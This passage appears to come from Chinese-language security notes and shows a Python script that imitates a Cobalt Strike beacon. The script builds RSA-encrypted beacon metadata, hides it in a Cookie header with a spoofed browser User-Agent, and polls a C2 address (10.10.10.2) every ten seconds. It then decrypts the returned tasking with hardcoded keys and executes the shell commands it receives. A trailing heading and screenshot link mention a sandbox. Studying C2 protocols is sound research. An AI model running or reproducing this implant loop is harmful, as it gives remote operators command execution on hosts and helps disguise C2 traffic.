pack=b'\x00\x00\xbe\xef\x00\x00\x00\x56\x65\x98\x6f\x9d\xd1\xba\x8c\xef\x84\x97\xca\xfe\x50\x04\x50\x47\xa8\x03\xa8\x03'+bytearray((beaconid).to_bytes(4, 'big'))+b'\x00\x00\x16\x34\x00\x00\x06\x06\x02\x23\xf0\x00\x00\x7f\xfe\xac\x63\xc1\xa0\xac\x63\x8f\x00'+bytearray(random.getrandbits(4) for _ in range(2))+b'\xa8\xc0\x44\x45\x53\x4b\x54\x4f\x50\x2d\x53\x4c\x31\x49\x4a\x45\x55\x09\x77\x75\x79\x61\x09\x62\x65\x61\x63\x6f\x6e\x5f\x78\x36\x34\x2e\x65\x78\x65\x09'


pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(
    key
)
enpack = rsa.encrypt(pack, pubkey)
#print(base64.b64encode(enpack).decode('utf-8'))

url = 'http://10.10.10.2/ca'
headers = {
    'Accept': '*/*',
    'Cookie': base64.b64encode(enpack).decode('utf-8'),
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; MAAU; NP08)',
    'Host': '10.10.10.2',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'no-cache'
}



while 1:
    time.sleep(10)
    request = urllib.request.Request(url, headers=headers)
    reponse = urllib.request.urlopen(request).read()
    if len(reponse)>1:
        #print(base64.b64encode(reponse).decode("utf-8"))
        data=decrypt_cobalt_strike_data(base64.b64encode(reponse).decode("utf-8"),'65986f9dd1ba8cef8497cafe50045047','c489347d6cf532ce15f69615063b349e')
        shell = extract_substring(data)
        
        output=execute_command(shell)
        print(shell,":",output)
```



# 沙箱

![image-20231230005356316](assets/image-20231230005356316.png)



